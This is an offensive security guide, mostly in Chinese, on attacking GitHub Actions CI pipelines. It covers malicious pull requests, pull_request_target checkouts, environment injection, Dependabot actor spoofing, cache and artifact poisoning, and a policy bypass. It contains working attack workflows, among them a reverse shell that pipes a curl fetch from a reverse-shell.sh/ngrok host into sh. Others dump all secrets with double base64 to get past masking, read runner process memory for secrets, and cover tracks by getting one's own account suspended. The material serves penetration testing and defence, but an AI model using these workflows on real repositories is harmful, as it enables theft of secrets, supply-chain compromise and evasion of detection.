# 滥用 Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## 工具

The following tools are useful to find Github Action workflows and even find vulnerable ones:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## 基本信息

在本页你会找到：

- 攻击者若成功访问 Github Action，会导致的**所有影响的摘要**
- 不同方式来**获取对 action 的访问**：
- 拥有**创建 action 的权限**
- 滥用与 **pull request** 相关的触发器
- 滥用 **其他外部访问** 技术
- 从已被入侵的 repo 进行 **Pivoting**
- 最后，一节关于**从内部滥用 action 的事后利用技术（以造成上述影响）**

## 影响摘要

关于 [**Github Actions check the basic information**](../basic-github-information.md#github-actions) 的入门介绍。

如果你能够在一个 **repository** 的 **GitHub Actions** 中执行任意代码，你可能能够：

- **窃取挂载到 pipeline 的 secrets**，并**滥用 pipeline 的权限**以获得对外部平台，例如 AWS 和 GCP 的未授权访问。
- **破坏部署**以及其他**artifacts**。
- 如果 pipeline 部署或存储资产，你可以篡改最终产品，从而发动供应链攻击。
- 在自定义 workers 上执行代码，以滥用计算能力并进行横向渗透（pivot）到其他系统。
- **覆盖 repository 代码**，取决于与 `GITHUB_TOKEN` 关联的权限。

## GITHUB_TOKEN

这个“**secret**”（来自 `${{ secrets.GITHUB_TOKEN }}` 和 `${{ github.token }}`）在管理员启用此选项时提供：

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

该 token 与 **Github Application** 使用的相同，因此可以访问相同的端点： [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github 应该发布一个 [**flow**](https://github.com/github/roadmap/issues/74) ，允许在 GitHub 内进行**跨仓库（cross-repository）**访问，因此一个 repo 可以使用 `GITHUB_TOKEN` 访问其他内部仓库。

你可以在以下链接查看该 token 的可能**权限**： [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

请注意，该 token 会在作业完成后**过期**。\
这些 tokens 看起来像这样： `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

使用该 token 可以做的一些有趣操作：

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> 注意：在多种情况下，你可能会在 **github user tokens inside Github Actions envs or in the secrets** 中发现这些。这些 tokens 可能会授予你对 repository 和 organization 更多权限。

<details>

<summary>在 Github Action 输出中列出 secrets</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>使用 secrets 获取 reverse shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

可以通过 **检查 actions 的日志** 来查看授予其他用户 repository 中的 Github Token 的权限：

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## 允许执行

> [!NOTE]
> 这是入侵 Github actions 的最简单方法，因为这种情形假设你可以 **create a new repo in the organization**，或对某个 **repository 拥有 write privileges**。
>
> 如果你处于这种情形，你可以直接查看 [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action)。

### Execution from Repo Creation

如果组织成员可以 **create new repos** 并且你可以执行 github actions，你可以 **create a new repo 并窃取组织级别设置的 secrets**。

### Execution from a New Branch

如果你可以在已经配置了 Github Action 的 repository 中 **create a new branch**，你可以 **modify** 它、**upload** 内容，然后 **execute that action from the new branch**。这样你可以 **exfiltrate repository and organization level secrets**（但你需要知道这些 secrets 的名称）。

> [!WARNING]
> 任何仅在 workflow YAML 中实现的限制（例如，`on: push: branches: [main]`、job 条件或手动门控）都可以被合作者编辑。若没有外部强制措施（branch protections、protected environments 和 protected tags），贡献者可以将 workflow 重新定位到他们的 branch 上运行，并滥用挂载的 secrets/permissions。

你可以让被修改的 action 在以下情况下可执行：**手动**、当 **PR 被创建** 或当 **有代码被 push**（取决于你想多吵闹）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Forked Execution

> [!NOTE]
> 存在不同的触发器可能允许攻击者 **execute a Github Action of another repository**。如果这些可触发的 actions 配置不当，攻击者可能会利用它们进行妥协。

### `pull_request`

工作流触发器 **`pull_request`** 会在每次收到 pull request 时执行该工作流，但有一些例外：默认情况下如果你是 **首次** **协作** 的人，某些 **维护者** 需要 **批准** 工作流的 **运行**：

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> 由于 **默认限制** 针对 **first-time** 贡献者，你可以通过提交一个 **修复有效 bug/typo** 的贡献来获得权限，然后发送 **其他 PR 来滥用你新的 `pull_request` 权限**。
>
> **我测试过，这个方法不起作用**：~~另一个选项是创建一个与项目贡献者同名的账号并删除他的账号。~~ 

此外，默认情况下对目标仓库 **阻止写权限** 和 **secrets 访问**，如[**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) 中所述：

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

攻击者可以修改 Github Action 的定义以执行任意操作并追加任意 actions。但是，由于上述限制，他无法窃取 secrets 或覆盖仓库。

> [!CAUTION]
> **是的，如果攻击者在 PR 中更改了将被触发的 github action，那么将使用他提供的 Github Action，而不是源仓库中的那个！**

由于攻击者也控制被执行的代码，即使 `GITHUB_TOKEN` 没有 secrets 或写权限，攻击者仍然可以例如 **上传恶意制品（upload malicious artifacts）**。

### **`pull_request_target`**

工作流触发器 **`pull_request_target`** 对目标仓库拥有 **写权限** 并且 **access to secrets**（且不需要额外批准）。

注意 workflow 触发器 **`pull_request_target`** 是在 **base 上下文** 中运行的，而不是在 PR 提供的上下文中运行（以 **不执行不受信任的代码**）。有关 `pull_request_target` 的更多信息请参阅 [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target)。\
此外，关于这一特定危险用法的更多信息，请查看这篇[**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)。

看起来因为被 **执行的工作流** 是在 **base** 中定义的而**不是在 PR 中**，使用 **`pull_request_target`** 似乎是 **安全的**，但在某些情况下并不是如此。

并且该触发将拥有 **access to secrets**。

### `workflow_run`

[**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) 触发器允许在另一个工作流 `completed`、`requested` 或 `in_progress` 时运行一个工作流。

在下面这个例子中，一个工作流被配置为在单独的 "Run Tests" 工作流完成后运行：
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
此外，根据文档：由 `workflow_run` 事件启动的 workflow 能够 **访问 secrets 并写入 tokens，即使之前的 workflow 无法**。

这种类型的 workflow 如果依赖于可以被外部用户通过 **`pull_request`** 或 **`pull_request_target`** 触发的 **workflow**，就可能被攻击。可以在 [**这篇博客**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability) 找到几个易受攻击的示例。第一个示例是由 **`workflow_run`** 触发的 workflow 下载攻击者的代码：`${{ github.event.pull_request.head.sha }}`\
第二个示例是 **将** 来自 **不受信任** 代码的 **artifact** 传递给 **`workflow_run`** workflow，并以一种使其 **易受 RCE** 的方式使用该 artifact 的内容。

### `workflow_call`

TODO

TODO: Check if when executed from a `pull_request` the used/downloaded code if the one from the origin or from the forked PR

## 滥用 forked 执行

我们已经提到外部攻击者能够使 github workflow 执行 的所有方式，现在让我们看看如果这些执行配置不当，可能如何被滥用：

### 不受信任的 checkout 执行

在 **`pull_request`** 的情况下，workflow 会在 PR 的上下文中执行（因此会执行 **恶意 PR 的代码**），但需要有人 **先授权**，并且它会有一些[限制](#pull_request)。

如果一个使用 **`pull_request_target` 或 `workflow_run`** 的 workflow 依赖于可以由 **`pull_request_target` 或 `pull_request`** 触发的 workflow，那么将会执行原始仓库的代码，因此 **攻击者无法控制被执行的代码**。

> [!CAUTION]
> 然而，如果该 **action** 有一个 **显式的 PR checkout**，会**从 PR 获取代码**（而不是从 base），那么它会使用攻击者控制的代码。例如（查看第 12 行，PR 代码在此处被下载）：

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

潜在的 **不受信任代码会在 `npm install` 或 `npm build` 期间被运行**，因为构建脚本和被引用的 **packages 由 PR 的作者控制**。

> [!WARNING]
> 一个用于搜索易受攻击 actions 的 github dork 是：`event.pull_request pull_request_target extension:yml`，然而，即使 action 配置不安全，也有不同的方法配置 jobs 以安全执行（例如使用关于谁是产生 PR 的 actor 的条件判断）。

### 上下文脚本注入 <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

注意，有些 [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) 的值是由创建 PR 的 **用户** 控制的。如果 github action 使用这些 **数据去执行任何东西**，可能会导致 **任意代码执行：**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV 脚本注入** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

根据文档：你可以通过定义或更新环境变量并将其写入 **`GITHUB_ENV`** 环境文件，来使该环境变量对工作流作业中的任意后续步骤可用。

如果攻击者能够在该 **env** 变量中**注入任意值**，就可以注入在后续步骤中会执行代码的环境变量，例如 **LD_PRELOAD** 或 **NODE_OPTIONS**。

例如（[**这篇**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) 和 [**这篇**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)），想象一个 workflow 信任上传的 artifact 并将其内容存入 **`GITHUB_ENV`** 环境变量。攻击者可以上传如下内容来破坏它：

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot 及其他受信任的 bots

如 [**这篇博文**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest) 所示，若干组织有一个 Github Action 会合并来自 `dependabot[bot]` 的任何 PRR（如下面所示）：
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
这会成为一个问题，因为 `github.actor` 字段包含了导致触发 workflow 的最新事件的用户。并且存在多种方法可以让 `dependabot[bot]` 用户修改一个 PR。例如：

- Fork 受害者 repository
- 向你的副本添加恶意 payload
- 在你的 fork 上启用 Dependabot 并添加一个过期的 dependency。Dependabot 会创建一个 branch 来修复该 dependency，同时包含恶意代码。
- 从该 branch 向 victim repository 打开一个 Pull Request（该 PR 会由用户创建，所以暂时不会发生任何事）
- 然后，攻击者返回到 Dependabot 在其 fork 中打开的初始 PR 并运行 `@dependabot recreate`
- 随后，Dependabot 在该 branch 上执行一些操作，修改了针对 victim repo 的 PR，使得 `dependabot[bot]` 成为触发该工作流的最新事件的 actor（因此，workflow 会运行）。

接下来，假设不是合并，而是 Github Action 存在类似下面的 command injection：
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
原博文提出了两种滥用该行为的方案，其中第二种是：

- Fork 受害者仓库并启用 Dependabot，使用某个过时的依赖。
- 创建一个新 branch，里面包含恶意的 shell injection 代码。
- 将仓库的默认 branch 改为该分支。
- 从该 branch 向受害者仓库创建一个 PR。
- 在 Dependabot 在其 fork 中打开的 PR 中运行 `@dependabot merge`。
- Dependabot 会将其更改合并到你的 fork 仓库的默认 branch 中，更新受害者仓库中的 PR，使 `dependabot[bot]` 成为触发 workflow 的最新事件的执行者，并使用恶意的 branch 名称。

### 易受攻击的第三方 Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

正如[**这篇博文**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)所述，这个 Github Action 允许访问来自不同 workflow 甚至不同仓库的 artifacts。

问题在于，如果未设置 **`path`** 参数，artifact 会被解压到当前目录，这可能覆盖随后在 workflow 中被使用甚至执行的文件。因此，如果该 Artifact 存在漏洞，攻击者可以滥用此行为来破坏其他信任该 Artifact 的 workflows。

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
可以使用以下工作流程进行攻击：
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Other External Access

### Deleted Namespace Repo Hijacking

如果一个 account 更改了 its name，其他用户在一段时间后可能会注册该名称的账号。如果某个仓库在更名之前拥有 **少于 100 星**，Github 会允许新注册且同名的用户创建一个与被删除仓库 **同名的 repository**。

> [!CAUTION]
> 因此，如果一个 action 使用来自不存在账号的 repo，攻击者仍然可能创建该账号并攻陷该 action。

如果其他仓库正在使用 **来自该用户仓库的 dependencies**，攻击者将能够劫持它们。更多完整说明见： [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> 在本节中，我们将讨论在假设对第一个仓库具有某种访问权限的情况下（参见上一节），能够 **pivot from one repo to another** 的技术。

### Cache Poisoning

同一分支的 **workflow 运行之间** 会维护一个 cache。这意味着如果攻击者妥协了一个被存入 cache 的 **package**，并且该 package 被更高权限的 workflow **下载** 并执行，那么攻击者也能妥协该 workflow。

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows 可能会使用 **来自其他 workflows，甚至其他 repos 的 artifacts**。如果攻击者设法妥协了负责 **uploads an artifact** 的 Github Action，而该 artifact 随后被另一个 workflow 使用，那么他就可能妥协其他那些 workflow：

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

如 [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass) 所述，即使某个仓库或组织有策略限制使用特定的 actions，攻击者仍可在 workflow 内下载（`git clone`）该 action，然后将其作为本地 action 引用。由于策略不影响本地路径，**该 action 将在没有任何限制的情况下被执行。**

示例：
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### 通过 OIDC 访问 AWS 和 GCP

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### 访问 secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

如果你将内容注入到脚本中，了解如何访问 secrets 很有用：

- 如果 secret 或 token 被设置为 **environment variable**，可以直接通过环境使用 **`printenv`** 访问。

<details>

<summary>在 Github Action 输出中列出 secrets</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>通过 secrets 获取 reverse shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- 如果 secret 被 **直接在表达式中使用**，生成的 shell 脚本会被存储在 **磁盘上** 并且可被访问。
- ```bash
cat /home/runner/work/_temp/*
```
- 对于 JavaScript actions，secrets 会通过 environment variables 传递
- ```bash
ps axe | grep node
```
- 对于一个 **custom action**，风险会根据程序如何使用从 **argument** 获取的 secret 而有所不同：

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- 通过 secrets context 列举所有 secrets（collaborator 级别）。拥有 write 权限的贡献者可以在任意分支修改 workflow 来转储所有 repository/org/environment secrets。使用双重 base64 来规避 GitHub 的日志掩码并在本地解码：

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decode locally:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: for stealth during testing, encrypt before printing (openssl is preinstalled on GitHub-hosted runners).

### 滥用 Self-hosted runners

查找哪些 **Github Actions** 在非 GitHub 基础设施上执行的方法是，在 Github Action 配置 yaml 中搜索 **`runs-on: self-hosted`**。

**Self-hosted** runners 可能可以访问 **额外敏感信息**、其他 **network systems**（网络中易受攻击的端点？metadata service？），或者即使它被隔离并销毁，**可能会同时运行多个 action**，恶意的那个可能会**窃取另一个的 secrets**。

在 self-hosted runners 中也可以通过转储其内存来获取 **secrets from the \_Runner.Listener**\_\*\* process\*\*，该进程在任意步骤中将包含所有 workflows 的 secrets：
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
查看 [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)。

### Github Docker 镜像注册表

可以创建 Github actions 来**在 Github 内构建并存储 Docker 镜像**。  
下面的可展开部分给出了一个示例：

<details>

<summary>Github Action 构建并推送 Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

如你在之前的代码中看到，Github 注册表托管在 **`ghcr.io`**。

具有对该 repo 读取权限的用户随后可以使用个人访问令牌下载 Docker Image:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
然后，用户可以搜索 **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions 日志中的敏感信息

即使 **Github** 试图在 actions 日志中 **detect secret values** 并 **avoid showing** 它们，action 执行过程中可能生成的 **other sensitive data** 不会被隐藏。例如，一个用 secret value 签名的 JWT 不会被隐藏，除非它被 [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## 掩盖你的痕迹

(技巧来自 [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) 首先，任何发起的 PR 在 Github 上对公众和目标 GitHub 帐户都是清晰可见的。默认情况下，我们 **can’t delete a PR of the internet**，但这里有个变通。对于被 Github **suspended** 的账户，他们的所有 **PRs are automatically deleted** 并从互联网上移除。因此，为了隐藏你的活动，你需要让你的 **GitHub account suspended or get your account flagged**。这将 **hide all your activities** 在 GitHub 上从互联网上（基本上移除你所有的 exploit PR）

一个在 GitHub 的组织通常会非常积极地向 GitHub 报告账户。你只需要在 Issue 中分享“某些东西”，他们就会确保在 12 小时内你的账户被 suspended :p 就这样，你的 exploit 在 github 上就变得不可见了。

> [!WARNING]
> 组织识别他们已被针对的唯一方法是从 SIEM 检查 GitHub 日志，因为从 GitHub UI 上这些 PR 会被移除。

## 参考资料

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
